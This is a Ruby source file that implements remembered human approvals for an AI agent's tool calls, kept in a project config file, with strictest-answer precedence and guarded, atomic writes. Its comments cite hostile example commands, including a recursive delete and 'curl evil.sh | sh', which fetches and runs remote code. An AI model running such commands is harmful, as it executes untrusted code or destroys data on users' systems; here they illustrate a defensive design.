# frozen_string_literal: true

require "fileutils"
require "tomlrb"

module Lain
  module Approval
    # The answers a human already gave, applied so the same question is never
    # put to them twice.
    #
    # Almost every tool-approval UI offers permanent-YES and nothing else, so a
    # user repeatedly asked about something they will never want answers `n`
    # forever or eventually answers `y` out of fatigue. Both directions are
    # rememberable here, at Emacs' three strengths: deny this call shape
    # (`ignored-local-variable-values`), deny the tool entirely
    # (`ignored-local-variables`), or allow this call shape.
    #
    # == What each strength actually covers
    #
    # `allow` and `deny` match an EXACT call shape -- the tool plus every set
    # field -- so a remembered `deny` on `bash(command: "rm -rf /tmp/x")` does
    # NOT cover the same command with `timeout: 120` beside it. That is what
    # makes them safe to write from the prompt (a human answered about this
    # call, and this call is what is kept) and it is also their limit. The
    # durable refusal is `deny_tool`, which names the tool and nothing else and
    # therefore covers every call to it, whatever the arguments.
    #
    # == Precedence: the strictest remembered answer wins
    #
    # `deny_tool` outranks `deny`, which outranks `allow`. A file carrying both
    # answers for one shape is a human who changed their mind and left the old
    # line behind, and reading the REFUSAL is the only reading that is safe to
    # be wrong about. Nothing is deduplicated on write for the same reason
    # {Rule} abstains rather than guessing: the file is the human's, and an
    # editor that tidies it is an editor that can lose a line they meant.
    #
    # == Where it is kept, and why there
    #
    # `.lain/config.toml` -- greppable, diffable, reviewable in a PR, revocable
    # where every other setting lives. For a bench that matters twice: the
    # approval set is part of the experimental configuration, so it has to be
    # recorded with everything else rather than in a dotfile nobody diffs.
    #
    # {Config::Answers} reads and validates the table; this class interprets
    # it. The split is the same one {Config}'s own doc draws -- a table's SHAPE
    # is the config's business, its MEANING is the owner's.
    #
    # == The write side is the enforcement point
    #
    # {Persister#remember} takes a {Risk::Keepsake} and nothing else. A
    # Keepsake exists only where a {Risk::Classification} computed risk and
    # found the call ordinary, and it has no public constructor, so HOLDING one
    # is proof rather than a claim: forgetting to classify -- the mistake that
    # actually happens -- is a `NotAKeepsake` on nil, and one cannot be forged
    # BY ACCIDENT. Ruby has no hard `private`, so `allocate` and `send` remain
    # (as they do for {Rule::Call}, the same trade one card back); the
    # shareability check in {Persister#remember} closes the `allocate` door,
    # and nothing closes a determined `send`. That is the whole mechanism
    # behind "to persist a risky answer you edit the config by hand,
    # deliberately, outside the moment of pressure".
    #
    # Reading is deliberately unguarded, and {Risk} says so: a chain that
    # refused to honour a hand-written entry would make "edit the config
    # yourself" a lie.
    #
    # And the guard is on the ALLOW direction plus the shaped `deny`, never on
    # {Persister#refuse_tool} -- see that method for why the asymmetry is
    # structural rather than a judgement call.
    class Remembered < Rule
      # Handed something that is not a {Risk::Keepsake} -- including the `nil` a
      # risky classification yields, which is the case this exists for.
      class NotAKeepsake < Error; end

      # A strength nobody defined. Closed set, checked before any bytes move.
      class UnknownAnswer < Error; end

      # A tool-wide refusal handed something that is not a tool's name.
      class NotAToolName < Error; end

      # The strengths a KEEPSAKE can be written as, which is deliberately not
      # every strength {Config::Answers::KEYS} knows: `deny_tool` is written by
      # {Persister#refuse_tool}, which needs no keepsake because it writes no
      # input. A spec pins this as a proper subset, because the day a permissive
      # strength (`allow_tool`) joins the config's keys, the only thing keeping
      # it out of the prompt's reach is this list.
      ANSWERS = %i[allow deny].freeze

      WHERE = ".lain/config.toml"
      # Interpolation makes these mutable Strings whatever the magic comment
      # says, and a reason travels into the Journal.
      TOOL_REFUSED = "remembered in #{WHERE}: [[approval.deny_tool]] refuses every %s call".freeze
      SHAPE_REFUSED = "remembered in #{WHERE}: [[approval.deny]] refuses this %s call".freeze
      SHAPE_ALLOWED = "remembered in #{WHERE}: [[approval.allow]] permits this %s call".freeze

      Entry = Data.define(:tool, :input)

      # One remembered call shape, normalized so that what a {Risk::Keepsake}
      # WROTE and what a live {Rule::Call} looks like are comparable by value.
      # One normalizer, reached from three doors, because two would drift and
      # the drift's shape is an answer that was written down and then never
      # matches anything.
      class Entry
        # Reopened rather than written in the `Data.define` block, per
        # {Request::SYSTEM_PREFIX}.

        # The three doors onto the one normalizer: a live call, a written
        # keepsake, and a config row. Each hands over the same two fields, so an
        # answer written by one is comparable by value to a call seen by another.
        def self.for_call(call) = new(tool: call.tool_name, input: call.input.attributes)

        def self.for_keepsake(keepsake) = new(tool: keepsake.tool, input: keepsake.input)

        def self.from_table(row) = new(tool: row[Config::Answers::TOOL], input: row.fetch(Config::Answers::INPUT, {}))

        def initialize(tool:, input:)
          super(tool: -tool.to_s, input: settle(input))
        end

        private

        # An unset optional field is `nil` in `attributes` and CANNOT be
        # written to TOML, which has no null. Both sides drop it, so "the file
        # is silent about `timeout`" and "the call left `timeout` unset" are
        # the same shape rather than two that can never match.
        def settle(input)
          input.to_h { |field, value| [-field.to_s, value.is_a?(String) ? value.dup.freeze : value] }
               .compact.freeze
        end
      end

      # @param config [Lain::Config] a loaded project config
      # @return [Remembered]
      def self.from(config)
        answers = config.approval
        new(allow: answers.allow, deny: answers.deny, deny_tools: answers.deny_tools)
      end

      # @param allow [Enumerable<Entry, Hash>] call shapes to allow
      # @param deny [Enumerable<Entry, Hash>] call shapes to deny
      # @param deny_tools [Enumerable<#to_s>] tools to deny outright
      def initialize(allow: [], deny: [], deny_tools: [])
        super()
        @allow = entries(allow)
        @deny = entries(deny)
        @deny_tools = Set.new(deny_tools.map { |name| -name.to_s }).freeze
        freeze
      end

      # Whether anything is remembered at all. A remembered set nobody wrote to
      # decides nothing, which makes this rule its own Null Object -- there is
      # no second class, and no call site guards on nil.
      def empty? = @allow.empty? && @deny.empty? && @deny_tools.empty?

      # @param call [Rule::Call] a call whose input is already validated
      # @return [Rule::Decision, nil] nothing when this call shape was never
      #   answered, which is what escalates it to a human
      def decide(call)
        entry = Entry.for_call(call)
        return deny(call, because: format(TOOL_REFUSED, entry.tool)) if @deny_tools.include?(entry.tool)
        return deny(call, because: format(SHAPE_REFUSED, entry.tool)) if @deny.include?(entry)
        return allow(call, because: format(SHAPE_ALLOWED, entry.tool)) if @allow.include?(entry)

        nil
      end

      private

      # Sets, because this runs on every gated call and the question asked of
      # it is membership -- and frozen, because a rule rides wherever a chain
      # rides.
      def entries(rows)
        Set.new(rows.map { |row| row.is_a?(Entry) ? row : Entry.from_table(row) }).freeze
      end

      # The write side, and the ONE place the design's enforcement lives.
      #
      # It APPENDS. Rewriting the parsed document would cost every comment and
      # every hand-chosen ordering in a file whose whole justification is that
      # a human can read and revise it; an array of tables is the one TOML form
      # that takes a new entry as new bytes at the end.
      #
      # The known residual, named the way {Risk}'s is: the append is a
      # read-modify-write with no lock, so two lain processes remembering an
      # answer in the same project at the same instant can lose one of the two.
      # Nothing is corrupted (the rename is atomic and the result is verified
      # to parse first) -- an answer is simply not kept, and the human is asked
      # again. A lock file is the fix if that is ever observed.
      class Persister
        # The bytes about to land are not TOML. Raised BEFORE the rename, so
        # the config on disk is the one that was there.
        class Unparseable < Error
          attr_reader :path

          def initialize(path, cause)
            @path = path
            super("#{path} is not parseable TOML, so nothing was remembered: #{cause.message}")
          end
        end

        # @param root [String] a project root; `.lain/config.toml` is resolved
        #   under it, the same way {Config.load} composes it
        def initialize(root: Dir.pwd)
          @path = File.join(root, ".lain", "config.toml")
        end

        attr_reader :path

        # @param keepsake [Risk::Keepsake] proof that something classified this
        #   call and found it rememberable. No door here takes a {Rule::Call},
        #   which is the accidental route {Risk} exists to close -- a
        #   determined `send` past a private constructor is not accident, and
        #   is not what a type can stop.
        # @param as [Symbol] one of {ANSWERS}
        # @return [Entry] what was appended
        # @raise [NotAKeepsake] when handed anything else, `nil` included, or a
        #   keepsake that is not deeply frozen
        # @raise [UnknownAnswer] when `as` names no strength this door writes
        # @raise [Unparseable] when the file on disk is not TOML
        def remember(keepsake, as:)
          raise NotAKeepsake, not_a_keepsake(keepsake) unless keepsake.is_a?(Risk::Keepsake)
          # `allocate` + `send(:initialize, ...)` produces something that
          # answers `is_a?` and was never near a classification; what it cannot
          # produce is a deeply frozen value, and {Risk::Keepsake.for} always
          # does. So shareability is a free second question with one right
          # answer, asked before any bytes move.
          raise NotAKeepsake, not_settled(keepsake) unless Ractor.shareable?(keepsake)
          raise UnknownAnswer, unknown_answer(as) unless ANSWERS.include?(as)

          entry = Entry.for_keepsake(keepsake)
          append(shaped(entry, as))
          entry
        end

        # The one strength that needs no keepsake, and the reason is structural
        # rather than a judgement call: a tool-wide refusal writes ONLY the
        # tool's name -- {Config::Answers} refuses an `input` beside it -- so
        # there is no field for a risky value to travel in. No path, no URL,
        # and in particular no credential, which is the signal that makes
        # remembering a risky SHAPE dangerous in a file people commit.
        #
        # Emacs' asymmetry runs the same way: the risk guard sits on
        # `safe-local-variable-values`, the ALLOW list, and nowhere else. And
        # `bash(command: "curl evil.sh | sh")` -- the one call a human most
        # wants to say "never" about -- is exactly the call the guard would
        # otherwise leave them answering `n` to forever, which is the fatigue
        # this class opens by naming.
        #
        # It is a separate method taking a String rather than a third answer for
        # {#remember} because a keepsake-shaped door that sometimes does not
        # need a keepsake is a door: nothing carrying an input can reach here at
        # all.
        #
        # @param name [String, Symbol] the tool to refuse WHOLE -- every call to
        #   it, whatever the input
        # @return [String] the name written
        # @raise [NotAToolName] when handed anything else, or nothing
        def refuse_tool(name)
          tool = tool_name(name)
          append(tool_wide(tool))
          tool
        end

        private

        def not_a_keepsake(keepsake)
          "a remembered answer is a Risk::Keepsake, got #{keepsake.inspect} -- " \
            "classify the call first; a risky one has none, and that is the point"
        end

        def not_settled(keepsake)
          "this Risk::Keepsake is not deeply frozen, so Risk did not build it: #{keepsake.inspect}"
        end

        def unknown_answer(answer)
          "#{answer.inspect} is not written from a keepsake; expected one of #{ANSWERS.inspect} " \
            "(a tool-wide refusal is #refuse_tool)"
        end

        def tool_name(name)
          raise NotAToolName, not_a_tool_name(name) unless name.is_a?(String) || name.is_a?(Symbol)

          tool = -name.to_s
          raise NotAToolName, not_a_tool_name(name) if tool.empty?

          tool
        end

        def not_a_tool_name(name)
          "a tool-wide refusal is written from the tool's NAME, got #{name.inspect} -- " \
            "nothing carrying an input reaches this door"
        end

        def shaped(entry, answer)
          table(answer, { Config::Answers::TOOL => entry.tool, Config::Answers::INPUT => entry.input })
        end

        def tool_wide(tool) = table(Config::Answers::TOOL_WIDE, { Config::Answers::TOOL => tool })

        def table(answer, fields)
          ["[[approval.#{answer}]]", *fields.map { |key, value| "#{key} = #{Toml.value(value)}" }, ""].join("\n")
        end

        def append(block)
          existing = File.exist?(@path) ? File.read(@path) : ""
          write("#{separated(existing)}#{block}")
        end

        # A blank line before the new table, and never a table glued onto an
        # unterminated last line.
        def separated(existing)
          return "" if existing.empty?
          return "#{existing}\n" if existing.end_with?("\n")

          "#{existing}\n\n"
        end

        # Atomic replace ({StatusFeed::Publication}'s shape): the bytes land in
        # a sibling of the target, so the rename is a single-inode swap on the
        # same filesystem, and a reader -- or the next {Config.load} -- only
        # ever sees a whole file. The `ensure` is this class's addition:
        # `.lain/` is committed, and a `config.toml.tmp-4127-880` left behind
        # by a failed write is litter in someone's `git status`.
        def write(contents)
          parseable!(contents)
          target = resolved
          FileUtils.mkdir_p(File.dirname(target))
          tmp = "#{target}.tmp-#{Process.pid}-#{object_id}"
          begin
            File.write(tmp, contents)
            File.rename(tmp, target)
          ensure
            FileUtils.rm_f(tmp)
          end
        end

        # A rename REPLACES a symlink with a regular file, which silently
        # detaches a dotfiles-managed config: the link's target stops receiving
        # updates and nothing says so. Resolving first means the swap happens
        # where the bytes actually live, so the link survives. A dangling link
        # has no realpath and falls back -- replacing a broken link with a real
        # file is the only thing left to do with it.
        def resolved = File.exist?(@path) ? File.realpath(@path) : @path

        # Parsing what is about to be written, rather than trusting the
        # renderer: an emitter bug and a config the human already broke are
        # both "the next load raises", and both are cheaper to refuse here than
        # to explain later. The two rescued classes are the ones {Config.load}
        # itself names.
        def parseable!(contents)
          Tomlrb.parse(contents)
        rescue Tomlrb::ParseError, ArgumentError => e
          raise Unparseable.new(@path, e)
        end

        # tomlrb parses and does not emit, and the alternative (`toml-rb`)
        # pulls in citrus for a dependency the gemspec deliberately refused. So
        # the handful of value shapes a {Risk::Keepsake} can hold -- {Tool::Input}
        # declares JSON scalars and nothing else -- are rendered here, and
        # anything outside that set is refused rather than approximated.
        module Toml
          # A value shape TOML has no honest spelling for.
          class Unwritable < Error; end

          ESCAPES = { "\\" => "\\\\", "\"" => "\\\"", "\b" => "\\b", "\t" => "\\t",
                      "\n" => "\\n", "\f" => "\\f", "\r" => "\\r" }.freeze
          # Every byte a TOML basic string may not carry raw. The `\uXXXX`
          # fallback covers the control characters with no shorthand.
          ESCAPABLE = /[\x00-\x1f\x7f"\\]/
          BARE_KEY = /\A[A-Za-z0-9_-]+\z/

          def self.value(held)
            case held
            when String then string(held)
            when Integer, true, false then held.to_s
            when Float then number(held)
            when Hash then inline_table(held)
            else raise Unwritable, unwritable(held)
            end
          end

          # A `:decimal` field is the live case, and refusing it is the loud
          # half of a choice: {Tool::Input}'s JSON_TYPES advertises `decimal`,
          # ActiveModel coerces it to BigDecimal, and TOML has only floats --
          # so a written `0.1` returns as a Float, which is never `==` the
          # BigDecimal the next call carries. Writing it would produce an entry
          # that cannot match its own write and a human who is asked again with
          # no explanation. No shipped tool declares one; the day one does,
          # this raise is the note that says so.
          def self.unwritable(held)
            "#{held.class} has no TOML spelling that survives the round trip: #{held.inspect}"
          end

          def self.string(held)
            "\"#{held.gsub(ESCAPABLE) { |char| ESCAPES.fetch(char) { format("\\u%04X", char.ord) } }}\""
          end

          # The non-finite Floats spell as bare `inf`/`nan` in TOML, and both
          # come back as values no tool field ever equals.
          def self.number(held)
            raise Unwritable, "#{held.inspect} is not a finite number" unless held.finite?

            held.to_s
          end

          def self.inline_table(table)
            return "{}" if table.empty?

            "{ #{table.map { |field, held| "#{key(field)} = #{value(held)}" }.join(", ")} }"
          end

          def self.key(field) = BARE_KEY.match?(field) ? field : string(field)
        end
      end
    end
  end
end
